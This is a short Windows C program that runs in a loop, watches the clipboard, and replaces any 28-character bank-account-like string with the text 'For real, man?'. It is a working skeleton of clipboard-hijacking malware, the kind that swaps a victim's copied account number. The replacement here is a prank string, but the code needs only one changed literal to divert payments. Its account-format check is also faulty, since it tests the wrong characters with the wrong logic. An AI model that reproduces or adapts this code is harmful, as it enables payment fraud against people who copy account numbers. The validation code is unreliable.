#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

int isBankAccount = 0;


int checkIfTextIsNumberOfBankAccount(char* text) {

    if (strlen(text) != 28)
        return 0;

    if (!(text[0] >= 'A' || text[1] <= 'Z'))
        return 0;

    for (int i = 2; i < 28; i++) {
        if (!isdigit(text[i]))
            return 0;
    }
    isBankAccount = 1;
    return 1;
}

int main() {
    system("cls");
    while (1) {
        if (!OpenClipboard(NULL)) {
            printf("Couldnt open clipboard! ");
            return 1;
        }

        HANDLE hClipboardData = GetClipboardData(CF_TEXT);
        if (hClipboardData == NULL) {
            printf("Couldnt get data from clipboard! Try again!");
            CloseClipboard();
            Sleep(1000);
            continue;
        }
        HANDLE textInClipboardHandle = GlobalLock(hClipboardData);
        char* textInClipboard = (char*)textInClipboardHandle;
        if (textInClipboard == NULL) {
            printf("Couldnt block access to clipboard! Try later!");
            CloseClipboard();
            Sleep(1000);
            continue;
        }

        if (checkIfTextIsNumberOfBankAccount(textInClipboard)) {
            textInClipboard = "For real, man?";
            EmptyClipboard();
            HGLOBAL hGlMem = GlobalAlloc(GHND, (DWORD)strlen(textInClipboard) + 1);
            if (hGlMem != NULL) {
                LPVOID lpGlMem = GlobalLock(hGlMem);
                if (lpGlMem != NULL) {
                    memcpy(lpGlMem, textInClipboard, strlen(textInClipboard) + 1);
                    GlobalUnlock(hGlMem);
                    SetClipboardData(CF_TEXT, hGlMem);
                }
            }
        }

        GlobalUnlock(hClipboardData);
        CloseClipboard();

        if (strcmp(textInClipboard, "For real, man?") == 0 && isBankAccount == 1) {
            isBankAccount = 0;
            printf("%s\n", textInClipboard);
        }
        else
            printf("No bank account in clipboard\n");

       Sleep(1000);
    }
    return 0;
}